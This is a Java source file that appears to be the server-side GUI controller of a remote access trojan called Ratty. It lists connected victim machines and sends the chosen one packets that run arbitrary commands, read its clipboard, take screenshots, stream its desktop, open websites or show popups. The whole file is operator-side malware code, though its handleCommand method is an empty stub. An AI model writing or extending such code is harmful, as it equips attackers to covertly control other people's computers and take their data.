package de.sogomn.rat.server.gui;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.DesktopPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.WebsitePacket;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.ServerClient;

public final class RattyGuiController extends AbstractRattyController implements IGuiController {
	
	private RattyGui gui;
	
	public RattyGuiController(final RattyGui gui) {
		this.gui = gui;
		
		gui.addListener(this);
	}
	
	/*
	 * ==================================================
	 * HANDLING
	 * ==================================================
	 */
	
	private PopupPacket createPopupPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final PopupPacket packet = new PopupPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private CommandPacket createCommandPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private WebsitePacket createWebsitePacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final WebsitePacket packet = new WebsitePacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private void handleCommand(final ServerClient client, final String command) {
		//...
	}
	
	private IPacket getPacket(final String command, final ServerClient client) {
		IPacket packet = null;
		
		if (command == RattyGui.FREE) {
			packet = new FreePacket();
		} else if (command == RattyGui.POPUP) {
			packet = createPopupPacket();
		} else if (command == RattyGui.CLIPBOARD) {
			packet = new ClipboardPacket();
		} else if (command == RattyGui.COMMAND) {
			packet = createCommandPacket();
		} else if (command == RattyGui.SCREENSHOT) {
			packet = new ScreenshotPacket();
		} else if (command == RattyGui.WEBSITE) {
			packet = createWebsitePacket();
		} else if (command == RattyGui.DESKTOP) {
			packet = new DesktopPacket(true);
		}
		
		return packet;
	}
	
	@Override
	protected boolean handlePacket(final ServerClient client, final IPacket packet) {
		return false;
	}
	
	/*
	 * ==================================================
	 * HANDLING END
	 * ==================================================
	 */
	
	@Override
	protected void logIn(final ServerClient client, final InformationPacket packet) {
		super.logIn(client, packet);
		
		gui.addRow(client);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final ServerClient client = getClient(connection);
		
		gui.removeRow(client);
		
		super.disconnected(connection);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		gui.removeAllListeners();
		
		super.closed(server);
	}
	
	@Override
	public void userInput(final String command) {
		final ServerClient client = gui.getLastServerClientClicked();
		final IPacket packet = getPacket(command, client);
		
		handleCommand(client, command);
		
		if (packet != null) {
			client.connection.addPacket(packet);
		}
	}
	
}
